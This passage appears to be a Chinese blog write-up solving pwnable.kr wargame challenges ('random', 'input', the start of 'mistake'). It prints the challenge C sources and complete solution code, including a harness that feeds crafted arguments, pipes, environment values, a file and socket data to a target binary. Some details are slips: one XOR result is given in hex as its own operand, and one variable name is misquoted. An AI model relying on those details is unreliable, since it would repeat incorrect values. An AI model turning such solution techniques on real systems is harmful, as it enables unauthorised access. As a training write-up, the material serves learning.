class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要输入一个值，与一个随机值异或之后要等于0xdeadbeef。</p><p>开始一直在想溢出，想不出来，就只好进gdb一步一步看有没有可以入手的点。过了一遍，没发现可以下手的地方，再过一遍，发现random的值和上一次一样。。。接着又试了几遍，random的值依旧不变。</p><p><img src="https://i.imgur.com/djFNaDI.png" alt=""><br>为<strong>0x6b8b4567</strong></p><p>所以，直接<strong>0xdeadbeef</strong> ^ <strong>0x6b8b4567</strong> = <strong>0x6b8b4567</strong> = <strong>3039230856</strong></p><p><img src="https://i.imgur.com/IevwWFj.png" alt=""></p><p><img src="https://i.imgur.com/xtwezoo.png" alt=""><br>其原因是没有设置srandom的值，所以seed就默认为1，所以随机值一直不变。</p><p>:)</p><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>题目: <strong>ssh <a href="mailto:input2@pwnable.kr" target="_blank" rel="noopener">input2@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here's your flag</span></span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按要求输入，过五关拿flag。</p><p>看样子好像很复杂，其实都是linux C中进程间通信很基本的知识，查查资料，翻翻man page就可以理解。(虽然我还是看了wp :|)</p><h3 id="Stage1-argv"><a href="#Stage1-argv" class="headerlink" title="Stage1 - argv"></a>Stage1 - argv</h3><p>1、要100个参数</p><p>2、参数argv[‘A’] = “\x00”</p><p>3、参数argv[‘B’] = “\x20\x0a\x0d”</p><p>解题代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *arg[<span class="number">101</span>] = &#123;<span class="string">"./input"</span>, [<span class="number">1</span> ... <span class="number">99</span>]=<span class="string">"A"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">arg[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">arg[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">execve(arg[<span class="number">0</span>], arg, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>arg[‘A’]表明取参数中的第65个参数，也就是A的ascii码。<br>B同理。</p><p>arg[]，env[] (等下会提到)最后跟一个NULL原因如下<br><img src="https://i.imgur.com/Hjyxxxy.png" alt=""></p><h3 id="Stage2-stdio"><a href="#Stage2-stdio" class="headerlink" title="Stage2 - stdio"></a>Stage2 - stdio</h3><p>1、从<strong>stdin</strong>中读取<strong>“\x00\x0a\x00\xff”</strong></p><p>2、从<strong>stderr</strong>中读取<strong>“\x00\x0a\x02\xff”</strong></p><p>需要用到<a href="https://linux.die.net/man/2/pipe" target="_blank" rel="noopener"><strong>pipe()</strong></a>，<a href="http://www.man7.org/linux/man-pages/man2/fork.2.html" target="_blank" rel="noopener"><strong>fork()</strong></a>，<a href="https://linux.die.net/man/2/dup" target="_blank" rel="noopener"><strong>dup2()</strong></a>等</p><p>先贴出题解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> cpid;</span><br><span class="line"><span class="keyword">int</span> fdstdin[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> fdstderr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pipe(fdstdin) &lt; <span class="number">0</span> || pipe(fdstderr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"can't creat a pipe!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cpid = fork();</span><br><span class="line"><span class="keyword">if</span>(cpid == <span class="number">0</span>)&#123;</span><br><span class="line">close(fdstdin[<span class="number">1</span>]);</span><br><span class="line">close(fdstderr[<span class="number">1</span>]);</span><br><span class="line">dup2(fdstdin[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">dup2(fdstderr[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line">close(fdstdin[<span class="number">0</span>]);</span><br><span class="line">close(fdstderr[<span class="number">0</span>]);</span><br><span class="line">execve(<span class="string">"/home/input2/input"</span>, arg, env);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">close(fdstdin[<span class="number">0</span>]);</span><br><span class="line">close(fdstderr[<span class="number">0</span>]);</span><br><span class="line">write(fdstdin[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">write(fdstderr[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line">close(fdstdin[<span class="number">1</span>]);</span><br><span class="line">close(fdstderr[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致流程如下</p><p><img src="https://i.imgur.com/xfdk6st.png" alt=""><br>父进程创建pipe  ↑</p><p><img src="https://i.imgur.com/SHuHYVP.png" alt=""><br>然后fork一个子进程，由于fork出的子进程与父进程几乎完全相同，所以子进程也连上了同一个pipe。  ↑</p><p><img src="https://i.imgur.com/T8QbkB9.png" alt=""><br>简单地说，pipe相当于作为两个进程通信的通道，pipe返回两个参数，fdstdin[0]指向pipe的read端，fdstdin[1]指向pipe的write端。fdstdin[1]从write端写入的数据会被fdstdin[0]从read端读取到。(fdstderr同理)</p><p>用close(fdstdin[0])和close(fdstdin[1])分别把父进程的读取端和子进程的输入端关掉，达到父进程写，子进程读的目的，如上图。(fdstderr同理)</p><p><img src="https://i.imgur.com/nl91Kkp.png" alt=""><br>然后把子进程的stdin和stderr分别映射到其fdstdin和fdstderr，再用execve调用input，就可以通过控制父进程利用pipe向子进程写数据达到题目要求。</p><h3 id="Stage3-env"><a href="#Stage3-env" class="headerlink" title="Stage3 - env"></a>Stage3 - env</h3><p>1、环境变量中<strong>“\xda\xad\xbe\xef”</strong>的值要为<strong>“\xca\xfe\xba\xbe”</strong></p><p>一开始想的是用setenv去设置环境变量的，貌似不好操作，发现可以直接通过刚才的execve传入环境变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *env[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">execve(<span class="string">"/home/input2/input"</span>, arg, env);</span><br></pre></td></tr></table></figure><h3 id="Stage4-file"><a href="#Stage4-file" class="headerlink" title="Stage4 - file"></a>Stage4 - file</h3><p>1、从文件名为<strong>“\x0a”</strong>的文件中读取到的前四个字节要为<strong>“\x00\x00\x00\x00”</strong></p><p>直接创建文件即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp;</span><br><span class="line">fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w+"</span>);</span><br><span class="line">fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h3 id="Stage5-network"><a href="#Stage5-network" class="headerlink" title="Stage5 - network"></a>Stage5 - network</h3><p>1、该题目作为服务器端，需要接收客户端发来的数据，并且数据的前四个字节为<strong>“\xde\xad\xbe\xef”</strong></p><p>2、服务器端口为第67个参数(arg[‘C’]);</p><p>最后一个Stage，考察的是linux C的网络编程基础。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arg[<span class="string">'C'</span>] = <span class="string">"4444"</span>;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line"><span class="keyword">int</span> s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">inet_pton(AF_INET, <span class="string">"127.0.0.1"</span>, &amp;server.sin_addr);</span><br><span class="line">server.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line"></span><br><span class="line">connect(s, (struct sockaddr *)&amp;server, <span class="keyword">sizeof</span>(server));</span><br><span class="line">write(s, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>);</span><br><span class="line">close(s);</span><br></pre></td></tr></table></figure><p>不加sleep(2)可能会出不了flag，网上的解释是client需要等待server进入accept状态。</p><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>把所有的综合起来</p><p>注意在运行之前要将该程序放在 /tmp/(自己再建一个文件夹)/ 这里运行，首先因为guest用户在/home/input2目录下没有创建文件的权限，而且直接在/tmp/下创建文件也拿不到flag。</p><p>创建好文件后还需要在当前目录执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/input2/flag flag</span><br></pre></td></tr></table></figure><p>来将flag软连接到真实的flag，否则程序无法找到flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>] = &#123;<span class="string">"./input"</span>, [<span class="number">1</span> ... <span class="number">99</span>]=<span class="string">"A"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    arg[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">arg[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">arg[<span class="string">'C'</span>] = <span class="string">"4444"</span>;</span><br><span class="line"><span class="keyword">char</span> *env[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">FILE *fp;</span><br><span class="line">fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w+"</span>);</span><br><span class="line">fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> cpid;</span><br><span class="line"><span class="keyword">int</span> fdstdin[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> fdstderr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pipe(fdstdin) &lt; <span class="number">0</span> || pipe(fdstderr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"can't creat a pipe!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cpid = fork();</span><br><span class="line"><span class="keyword">if</span>(cpid == <span class="number">0</span>)&#123;</span><br><span class="line">close(fdstdin[<span class="number">1</span>]);</span><br><span class="line">close(fdstderr[<span class="number">1</span>]);</span><br><span class="line">dup2(fdstdin[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">dup2(fdstderr[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line">close(fdstdin[<span class="number">0</span>]);</span><br><span class="line">close(fdstderr[<span class="number">0</span>]);</span><br><span class="line">execve(<span class="string">"/home/input2/input"</span>, arg, env);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">close(fdstdin[<span class="number">0</span>]);</span><br><span class="line">close(fdstderr[<span class="number">0</span>]);</span><br><span class="line">write(fdstdin[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">write(fdstderr[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line">close(fdstdin[<span class="number">1</span>]);</span><br><span class="line">close(fdstderr[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line"><span class="keyword">int</span> s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">inet_pton(AF_INET, <span class="string">"127.0.0.1"</span>, &amp;server.sin_addr);</span><br><span class="line">server.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line"></span><br><span class="line">connect(s, (struct sockaddr *)&amp;server, <span class="keyword">sizeof</span>(server));</span><br><span class="line">write(s, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>);</span><br><span class="line">close(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">input2@ubuntu:/tmp/666$ ./demacia</span><br><span class="line">Welcome to pwnable.kr</span><br><span class="line">Let&apos;s see if you know how to give input to program</span><br><span class="line">Just give me correct inputs then you will get the flag :)</span><br><span class="line">Stage 1 clear!</span><br><span class="line">Stage 2 clear!</span><br><span class="line">Stage 3 clear!</span><br><span class="line">Stage 4 clear!</span><br><span class="line">Stage 5 clear!</span><br><span class="line">input2@ubuntu:/tmp/666$ Mommy! I learned how to pass various input in Linux :)</span><br></pre></td></tr></table></figure><p>参考：<a href="http://staff.ustc.edu.cn/~guoyan/os12/LinuxC.pdf" target="_blank" rel="noopener">http://staff.ustc.edu.cn/~guoyan/os12/LinuxC.pdf</a></p><h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>题目：<strong>ssh <a href="mailto:mistake@pwnable.kr" target="_blank" rel="noopener">mistake@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span 